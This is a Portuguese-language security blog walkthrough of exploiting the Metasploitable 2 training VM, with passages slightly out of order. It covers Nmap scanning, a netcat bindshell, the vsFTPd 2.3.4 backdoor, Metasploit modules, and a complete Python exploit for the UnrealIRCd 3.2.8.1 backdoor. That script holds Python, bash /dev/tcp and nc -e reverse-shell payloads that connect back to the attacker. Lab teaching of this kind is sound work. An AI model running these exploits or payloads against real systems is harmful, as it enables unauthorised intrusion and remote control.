auxiliary/scanner/http/dir_scanner . normal No HTTP Directory Scanner Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/http/dir_scanner Selecionando o módulo:\n1 msf6 \u003e use auxiliary/scanner/http/dir_scanner Mostrando as opções disponíveis:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 msf6 auxiliary(scanner/http/dir_scanner) \u003e show options Module options (auxiliary/scanner/http/dir_scanner): Name Current Setting Required Description ---- --------------- -------- ----------- DICTIONARY /usr/share/metasploit-framework/d no Path of word dictionary to use ata/wmap/wmap_dirs.txt PATH / yes The path to identify files Proxies no A proxy chain of format type:host:port[,type:host:port][.. .] RHOSTS yes The target host(s), see https://docs.metasploit.com/docs/u sing-metasploit/basics/using-metasploit.html RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections THREADS 1 yes The number of concurrent threads (max one per host) VHOST no HTTP server virtual host Configurando o alvo:\n1 2 msf6 auxiliary(scanner/http/dir_scanner) \u003e set RHOSTS 192.168.1.30 RHOSTS =\u003e 192.168.1.30 Por fim, vamos executar o módulo.\n1 2 3 4 5 6 7 8 9 10 11 12 msf6 auxiliary(scanner/http/dir_scanner) \u003e run [*] Detecting error code [*] Using code '404' as not found for 192.168.1.30 [+] Found http://192.168.1.30:80/cgi-bin/ 403 (192.168.1.30) [+] Found http://192.168.1.30:80/doc/ 200 (192.168.1.30) [+] Found http://192.168.1.30:80/icons/ 200 (192.168.1.30) [+] Found http://192.168.1.30:80/index/ 200 (192.168.1.30) [+] Found http://192.168.1.30:80/phpMyAdmin/ 200 (192.168.1.30) [+] Found http://192.168.1.30:80/test/ 200 (192.168.1.30) [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed O módulo retornou uma lista de diretórios, que podem conter informações sensíveis ou vulnerabilidades que podem ser exploradas. Um diretório interessante seria o /phpMyAdmin/. Vamos tentar explorá-lo utilizando o seguinte módulo de injeção de argumento CGI (Common Gateway Interface) no PHP.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 msf6 \u003e search php_cgi Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/multi/http/php_cgi_arg_injection 2012-05-03 excellent Yes PHP CGI Argument Injection 1 exploit/windows/http/php_cgi_arg_injection_rce_cve_2024_4577 2024-06-06 excellent Yes PHP CGI Argument Injection Remote Code Execution 2 \\_ target: Windows PHP . . . . 3 \\_ target: Windows Command . . . . Interact with a module by name or index. For example info 3, use 3 or use exploit/windows/http/php_cgi_arg_injection_rce_cve_2024_4577 After interacting with a module you can manually set a TARGET with set TARGET 'Windows Command' Vamos utilizar a opção 0.\n1 2 msf6 \u003e use 0 [*] Using configured payload php/meterpreter/reverse_tcp Configurando o alvo:\n1 2 msf6 exploit(multi/http/php_cgi_arg_injection) \u003e set RHOSTS 192.168.1.30 RHOSTS =\u003e 192.168.1.30 Por fim, vamos executar o exploit.\n1 2 3 4 msf6 exploit(multi/http/php_cgi_arg_injection) \u003e exploit [*] Started reverse TCP handler on 172.18.18.105:4444 [*] Exploit completed, but no session was created. Infelizmente, o exploit falhou em minha máquina. De acordo com este vídeo, após injetar um argumento malicioso na solicitação CGI e explorar a vulnerabilidade no PHP, obteríamos um shell reverso na máquina alvo, permitindo controle remoto e acesso a informações. Veja um screenshot deste vídeo:\nConsiderações finais Neste blog post, vimos que a máquina Metasploitable 2 é uma ótima oportunidade para quem deseja aprender sobre segurança cibernética, oferecendo uma ampla gama de vulnerabilidades para explorar. Além disso, o Metasploit Framework também se destaca como uma ferramenta para esse aprendizado, facilitando a identificação e exploração de falhas nesses ambientes.\nReferências Rapid7. Metasploitable 2 Exploitability Guide. Disponível em: https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/\nRapid7. Metasploit Documentation. Disponível em: https://docs.metasploit.com\nOffSec. Scanner FTP Auxiliary Modules. Disponível em: https://www.offsec.com/metasploit-unleashed/scanner-ftp-auxiliary-modules/\nInfoSec Pat. How To Hack and Exploit Port 80 HTTP Metasploitable 2. Disponível em: https://www.youtube.com/watch?v=HH7DPfYTfoI\n","wordCount":"3859","inLanguage":"en","image":"http://localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2024-08-11T00:00:00Z","dateModified":"2024-08-11T00:00:00Z","author":{"@type":"Person","name":"brenoppr"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:1313/blog/2024-08-11-exploracao-metasploitable2/"},"publisher":{"@type":"Organization","name":"Blog do GRIS","logo":{"@type":"ImageObject","url":"http://localhost:1313/images/gris-logo-2020%27s_black.png"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=http://localhost:1313/ accesskey=h title="Home (Alt + H)"><img src=http://localhost:1313/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://localhost:1313/blog/ title=Blog><span>Blog</span></a></li><li><a href=http://localhost:1313/categories/ title=Categorias><span>Categorias</span></a></li><li><a href=http://localhost:1313/tags/ title=Tags><span>Tags</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=http://localhost:1313/>Home</a>&nbsp;»&nbsp;<a href=http://localhost:1313/blog/>Blogs</a></div><h1 class="post-title entry-hint-parent">Exploração de vulnerabilidades em ambientes virtuais</h1><div class=post-description>Exploração de vulnerabilidades da máquina Metasploitable 2</div><div class=post-meta><span title='2024-08-11 00:00:00 +0000 UTC'>August 11, 2024</span>&nbsp;·&nbsp;19 min&nbsp;·&nbsp;3859 words&nbsp;·&nbsp;brenoppr&nbsp;|&nbsp;<a href=https://github.com/grisufrj/grisufrj.github.io/tree/main/content/blog/2024-08-11-exploracao-metasploitable2.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><div class=post-content><h2 id=introdução>Introdução<a hidden class=anchor aria-hidden=true href=#introdução>#</a></h2><p>Neste post, vamos abordar como identificar e explorar algumas vulnerabilidades comuns encontradas na máquina vulnerável Metasploitable 2, utilizando ferramentas e métodos que são amplamente aplicáveis em cenários reais.</p><h2 id=o-que-é-o-metasploitable-2>O que é o Metasploitable 2?<a hidden class=anchor aria-hidden=true href=#o-que-é-o-metasploitable-2>#</a></h2><p>Metasploitable 2 é uma máquina virtual intencionalmente vulnerável, desenvolvida pela Rapid7, projetada para ser uma plataforma de prática para profissionais e entusiastas de segurança cibernética. Ela simula um ambiente de rede com várias vulnerabilidades conhecidas, permitindo que os usuários testem e aprimorem suas habilidades em pentest sem comprometer sistemas reais.</p><p>Essa máquina contém diversos serviços mal configurados e softwares desatualizados, representando um campo de treino ideal para aprender a identificar e explorar falhas de segurança de forma controlada.</p><p><img alt="Figura 1" loading=lazy src=/images/gabriel-breno-post-metasploitable2/metasploitablehome.png></p><p><strong>Figura 1:</strong> Metasploitable 2 sendo executado em uma Máquina Virtual.</p><p>Um guia para a instalação do ambiente do Metasploitable 2 pode ser encontrado <a href=https://docs.rapid7.com/metasploit/metasploitable-2/>aqui</a>.</p><h2 id=exploração-inicial-enumeração-de-portas>Exploração inicial: Enumeração de portas<a hidden class=anchor aria-hidden=true href=#exploração-inicial-enumeração-de-portas>#</a></h2><p>A exploração inicial de qualquer sistema vulnerável começa com a enumeração de portas, uma etapa essencial para identificar quais serviços estão em execução e, potencialmente, vulneráveis. Para isso, utilizamos o Nmap (Network Mapper), uma ferramenta poderosa e amplamente utilizada em testes de penetração. O Nmap permite mapear a rede e descobrir portas abertas, além de coletar informações detalhadas sobre os serviços, versões e sistemas operacionais em execução.</p><p>Essas informações são cruciais para planejar as etapas subsequentes da exploração, pois ajudam a direcionar os esforços para vulnerabilidades específicas que podem ser exploradas com sucesso.</p><p><img alt="Figura 2" loading=lazy src=/images/gabriel-breno-post-metasploitable2/nmap.png></p><p><strong>Figura 2:</strong> O comando Nmap é usado para descobrir quais serviços estão rodando em quais portas no IP da máquina vulnerável.</p><p>Podemos ver diversas portas abertas, cada uma com um serviço diferente que pode ou não ser vulnerável. Neste post, não abordaremos todas as vulnerabilidades, mas podemos imediatemente abordar algumas que nos saltam aos olhos.</p><h2 id=bindshell>Bindshell<a hidden class=anchor aria-hidden=true href=#bindshell>#</a></h2><p>A porta 1524 aberta na Metasploitable 2 representa uma vulnerabilidade crítica, conhecida como &ldquo;bindshell&rdquo;. Essa vulnerabilidade ocorre quando um shell é vinculado diretamente a uma porta, permitindo que qualquer atacante que se conecte a essa porta obtenha acesso ao sistema com privilégios elevados, sem a necessidade de autenticação.</p><p>Podemos explorá-la utilizando o comando nc (netcat) para conectar ao IP da máquina na porta 1524.</p><p><img alt="Figura 3" loading=lazy src=/images/gabriel-breno-post-metasploitable2/bindshell.png></p><p><strong>Figura 3:</strong> O netcat é usado para se conectar ao IP da máquina vulnerável na porta 1524. O comando whoami mostra que nós de fato estamos executando código na máquina vulnerável como o usuário raiz (root).</p><h2 id=vsftpd>vsFTPd<a hidden class=anchor aria-hidden=true href=#vsftpd>#</a></h2><p>Ao tentar se conectar ao serviço FTP na porta 21, podemos ver que ela está vinculada ao vsFTPd versão 2.3.4. Uma busca rápida no Google nos mostra que este serviço está sujeito a uma vulnerabilidade de backdoor (<a href=https://www.exploit-db.com/exploits/49757>CVE-2011-2523</a>).</p><p>Ao tentar logar com um nome de usuário finalizado em &ldquo;:)&rdquo;, sem aspas, um shell é criado e passa a ser servido na porta 6200 com privilégios de administrador.</p><p><img alt="Figura 4" loading=lazy src=/images/gabriel-breno-post-metasploitable2/vsftpd1.png></p><p><strong>Figura 4:</strong> Ao tentar se logar com o usuário terminado em :), a autenticação parece falhar. No entanto&mldr;</p><p><img alt="Figura 5" loading=lazy src=/images/gabriel-breno-post-metasploitable2/vsftpd2.png></p><p><strong>Figura 5:</strong> Conseguimos nos conectar na porta 6200, muito similar à vulnerabilidade do bindshell vista anteriormente.</p><h2 id=unrealircd>UnrealIRCd<a hidden class=anchor aria-hidden=true href=#unrealircd>#</a></h2><p>O serviço de IRC na porta 6667 é o UnrealIRCd versão 3.2.8.1. Isso pode ser checado com um script do Nmap para obter informações de serviços IRC.</p><p><img alt="Figura 6" loading=lazy src=/images/gabriel-breno-post-metasploitable2/irc1.png></p><p><strong>Figura 6:</strong> Os scripts do Nmap podem nos ajudar a receber informações de serviços que seriam difíceis de conseguir de outras formas.</p><p>Ao pesquisar por esta versão, é possível novamente confirmar que ela é sujeita a uma vulnerabilidade backdoor como descrita no <a href=https://www.exploit-db.com/exploits/16922>CVE-2010-2075</a>, que permite injeção de comando na máquina vulnerável. No entanto, esta vulnerabilidade é um pouco mais complexa que a última, então para explorar ela usamos o seguinte <a href=https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor/blob/master/exploit.py>script</a>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=c1>#!/usr/bin/python3</span>
</span></span><span class=line><span class=cl><span class=n>import</span> <span class=n>argparse</span>
</span></span><span class=line><span class=cl><span class=n>import</span> <span class=n>socket</span>
</span></span><span class=line><span class=cl><span class=n>import</span> <span class=n>base64</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Sets the target ip and port from argparse</span>
</span></span><span class=line><span class=cl><span class=n>parser</span> <span class=o>=</span> <span class=n>argparse</span><span class=o>.</span><span class=n>ArgumentParser</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s1>&#39;ip&#39;</span><span class=p>,</span> <span class=n>help</span><span class=o>=</span><span class=s1>&#39;target ip&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s1>&#39;port&#39;</span><span class=p>,</span> <span class=n>help</span><span class=o>=</span><span class=s1>&#39;target port&#39;</span><span class=p>,</span> <span class=n>type</span><span class=o>=</span><span class=ne>int</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s1>&#39;-payload&#39;</span><span class=p>,</span> <span class=n>help</span><span class=o>=</span><span class=s1>&#39;set payload type&#39;</span><span class=p>,</span> <span class=n>required</span><span class=o>=</span><span class=n>True</span><span class=p>,</span> <span class=n>choices</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;python&#39;</span><span class=p>,</span> <span class=s1>&#39;netcat&#39;</span><span class=p>,</span> <span class=s1>&#39;bash&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>args</span> <span class=o>=</span> <span class=n>parser</span><span class=o>.</span><span class=n>parse_args</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Sets the local ip and port (address and port to listen on)</span>
</span></span><span class=line><span class=cl><span class=n>local_ip</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>  <span class=c1># CHANGE THIS</span>
</span></span><span class=line><span class=cl><span class=n>local_port</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>  <span class=c1># CHANGE THIS </span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># The different types of payloads that are supported</span>
</span></span><span class=line><span class=cl><span class=n>python_payload</span> <span class=o>=</span> <span class=n>f</span><span class=s1>&#39;python -c &#34;import os;import pty;import socket;tLnCwQLCel=</span><span class=se>\&#39;</span><span class=s1>{local_ip}</span><span class=se>\&#39;</span><span class=s1>;EvKOcV={local_port};QRRCCltJB=socket.socket(socket.AF_INET,socket.SOCK_STREAM);QRRCCltJB.connect((tLnCwQLCel,EvKOcV));os.dup2(QRRCCltJB.fileno(),0);os.dup2(QRRCCltJB.fileno(),1);os.dup2(QRRCCltJB.fileno(),2);os.putenv(</span><span class=se>\&#39;</span><span class=s1>HISTFILE</span><span class=se>\&#39;</span><span class=s1>,</span><span class=se>\&#39;</span><span class=s1>/dev/null</span><span class=se>\&#39;</span><span class=s1>);pty.spawn(</span><span class=se>\&#39;</span><span class=s1>/bin/bash</span><span class=se>\&#39;</span><span class=s1>);QRRCCltJB.close();&#34; &#39;</span>
</span></span><span class=line><span class=cl><span class=n>bash_payload</span> <span class=o>=</span> <span class=n>f</span><span class=s1>&#39;bash -i &gt;&amp; /dev/tcp/{local_ip}/{local_port} 0&gt;&amp;1&#39;</span>
</span></span><span class=line><span class=cl><span class=n>netcat_payload</span> <span class=o>=</span> <span class=n>f</span><span class=s1>&#39;nc -e /bin/bash {local_ip} {local_port}&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># our socket to interact with and send payload</span>
</span></span><span class=line><span class=cl><span class=n>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>create_connection</span><span class=p>((</span><span class=n>args</span><span class=o>.</span><span class=n>ip</span><span class=p>,</span> <span class=n>args</span><span class=o>.</span><span class=n>port</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>except</span> <span class=n>socket</span><span class=o>.</span><span class=n>error</span> <span class=n>as</span> <span class=n>error</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;connection to target failed...&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>error</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=c1># craft out payload and then it gets base64 encoded</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>gen_payload</span><span class=p>(</span><span class=n>payload_type</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>base</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span><span class=n>payload_type</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>f</span><span class=s1>&#39;echo {base.decode()} |base64 -d|/bin/bash&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># all the different payload options to be sent</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>payload</span> <span class=o>==</span> <span class=s1>&#39;python&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>s</span><span class=o>.</span><span class=n>sendall</span><span class=p>((</span><span class=n>f</span><span class=s1>&#39;AB; {gen_payload(python_payload)} </span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;connection made, but failed to send exploit...&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>payload</span> <span class=o>==</span> <span class=s1>&#39;netcat&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>s</span><span class=o>.</span><span class=n>sendall</span><span class=p>((</span><span class=n>f</span><span class=s1>&#39;AB; {gen_payload(netcat_payload)} </span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;connection made, but failed to send exploit...&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>payload</span> <span class=o>==</span> <span class=s1>&#39;bash&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>s</span><span class=o>.</span><span class=n>sendall</span><span class=p>((</span><span class=n>f</span><span class=s1>&#39;AB; {gen_payload(bash_payload)} </span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;connection made, but failed to send exploit...&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=c1>#check display any response from the server</span>
</span></span><span class=line><span class=cl><span class=n>data</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>data</span> <span class=o>!=</span> <span class=s1>&#39;&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;Exploit sent successfully!&#39;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>Este script enviará para o IP da máquina vulnerável um comando para conectá-la à nossa na porta especificada (no caso, definimos no script como 7777). Para receber esse sinal, podemos usar o próprio netcat, usado anteriormente, para criar um servidor que escuta por requisições na nossa porta 7777.</p><p>Ao receber essa conexão, imediatamente temos acesso ao shell da máquina vulnerável, novamente como usuário root.</p><p><img alt="Figura 7" loading=lazy src=/images/gabriel-breno-post-metasploitable2/irc2.png></p><p><strong>Figura 7:</strong> O script se conecta à maquina vulnerável e a faz criar uma requisição para nossa porta 7777.</p><p><img alt="Figura 8" loading=lazy src=/images/gabriel-breno-post-metasploitable2/irc3.png></p><p><strong>Figura 8:</strong> Ao receber a requisição, nosso servidor passa para o modo interativo e conseguimos acesso ao shell remoto.</p><h2 id=introdução-ao-metasploit-explorando-serviços-vulneráveis>Introdução ao Metasploit: Explorando Serviços Vulneráveis<a hidden class=anchor aria-hidden=true href=#introdução-ao-metasploit-explorando-serviços-vulneráveis>#</a></h2><p>Até o momento, utilizamos diversas ferramentas para mapear e interagir com os serviços ativos na máquina. Embora essas ferramentas individuais sejam poderosas, há um framework que consolida várias dessas capacidades em uma única plataforma: o Metasploit, que contém centenas de módulos para exploração de vulnerabilidades.</p><p>A seguir, vamos explorar alguns módulos que lidam com servidores FTP vulneráveis para verificar se o serviço FTP que encontramos permite acesso anônimo, um vetor de ataque comum em sistemas mal configurados.</p><h2 id=anonymous-ftp-login>Anonymous FTP Login<a hidden class=anchor aria-hidden=true href=#anonymous-ftp-login>#</a></h2><p>Neste tutorial, usaremos o Metasploit para explorar uma vulnerabilidade conhecida em um servidor FTP e obter informações sobre as senhas dos usuários.</p><p>Para começar, você precisa abrir o Metasploit. Se estiver usando o Kali Linux, o Metasploit já vem pré-instalado. Basta abrir um terminal e digitar o seguinte comando para iniciá-lo:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>└─$ msfconsole
</span></span></code></pre></td></tr></table></div></div><p>Se estiver usando outra distribuição Linux, você pode consultar a documentação do Metasploit no seguinte link: <a href=https://docs.metasploit.com/>https://docs.metasploit.com/</a>.</p><p>O primeiro módulo que usaremos é o scanner/ftp/anonymous, que verifica se o servidor FTP permite acesso anônimo. Digite os seguintes comandos no prompt do Metasploit:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>└─$ msf6 &gt; use auxiliary/scanner/ftp/anonymous
</span></span></code></pre></td></tr></table></div></div><p>Em seguida, configure o endereço IP do alvo.</p><p><em>Observação: o IP da sua máquina Metasploitable 2 pode ser diferente deste abaixo. Para consultá-lo, entre em sua máquina virtual, digite o comando <code>ip a</code> no terminal e procure pelo endereço IP associado à interface eth0.</em></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msf6 auxiliary<span class=o>(</span>scanner/ftp/anonymous<span class=o>)</span> &gt; <span class=nb>set</span> RHOSTS 192.168.1.30
</span></span><span class=line><span class=cl><span class=nv>RHOSTS</span> <span class=o>=</span>&gt; 192.168.1.30
</span></span></code></pre></td></tr></table></div></div><p>Agora, execute o scanner para verificar o acesso anônimo:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msf6 auxiliary<span class=o>(</span>scanner/ftp/anonymous<span class=o>)</span> &gt; run
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 192.168.1.30:21       - 192.168.1.30:21 - Anonymous READ <span class=o>(</span><span class=m>220</span> <span class=o>(</span>vsFTPd 2.3.4<span class=o>))</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 192.168.1.30:21       - Scanned <span class=m>1</span> of <span class=m>1</span> hosts <span class=o>(</span>100% <span class=nb>complete</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Auxiliary module execution completed
</span></span></code></pre></td></tr></table></div></div><p>Veja que o FTP permite login anônimo. Podemos, usar um exploit específico para uma vulnerabilidade conhecida no vsFTPd 2.3.4 (Very Secure FTP Daemon): o vsftpd_234_backdoor. Este módulo explora a vulnerabilidade do vsFTPd 2.3.4 para obter uma shell interativa.</p><p>Para isso, digite os seguintes comandos:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msf6 auxiliary<span class=o>(</span>scanner/ftp/anonymous<span class=o>)</span> &gt; use exploit/unix/ftp/vsftpd_234_backdoor
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> No payload configured, defaulting to cmd/unix/interact
</span></span></code></pre></td></tr></table></div></div><p>Configure o endereço IP do alvo e a porta (por padrão, o FTP usa a porta 21):</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msf6 exploit<span class=o>(</span>unix/ftp/vsftpd_234_backdoor<span class=o>)</span> &gt; <span class=nb>set</span> RHOSTS 192.168.1.30
</span></span><span class=line><span class=cl><span class=nv>RHOSTS</span> <span class=o>=</span>&gt; 192.168.1.30
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>msf6 exploit<span class=o>(</span>unix/ftp/vsftpd_234_backdoor<span class=o>)</span> &gt; <span class=nb>set</span> RPORT <span class=m>21</span>
</span></span><span class=line><span class=cl><span class=nv>RPORT</span> <span class=o>=</span>&gt; <span class=m>21</span>
</span></span></code></pre></td></tr></table></div></div><p>Agora, execute o exploit:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msf6 exploit<span class=o>(</span>unix/ftp/vsftpd_234_backdoor<span class=o>)</span> &gt; run
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 192.168.1.30:21 - Banner: <span class=m>220</span> <span class=o>(</span>vsFTPd 2.3.4<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 192.168.1.30:21 - USER: <span class=m>331</span> Please specify the password.
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 192.168.1.30:21 - Backdoor service has been spawned, handling...
